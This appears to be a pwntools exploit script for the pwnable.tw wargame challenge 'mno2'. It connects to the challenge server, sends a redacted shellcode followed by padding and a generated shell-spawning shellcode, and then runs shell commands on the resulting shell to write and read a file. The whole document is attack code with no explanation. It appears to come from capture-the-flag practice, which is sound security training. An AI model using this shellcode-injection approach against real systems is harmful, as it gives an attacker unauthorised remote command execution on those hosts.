#from yeonnic import *
from pwn import *

elf=ELF("./mno2")

# p=process("./mno2")
p=remote("chall.pwnable.tw", 10301)

#gdb_attach(p,"b *0x80487e8\nc")

# Redacted
print len(shellcode)
p.sendline(shellcode)
p.sendline("A"*0x3a+asm(shellcraft.sh()))

import time
time.sleep(1)
# p.sendline('cat /home/mno2/flag')
p.sendline('echo "OOO{hello}" > /dev/shm/juno1234')
p.sendline('cat /dev/shm/juno1234')
# print 'OOO{' + p.recv() + '}'

print p.recv()
# p.interactive()
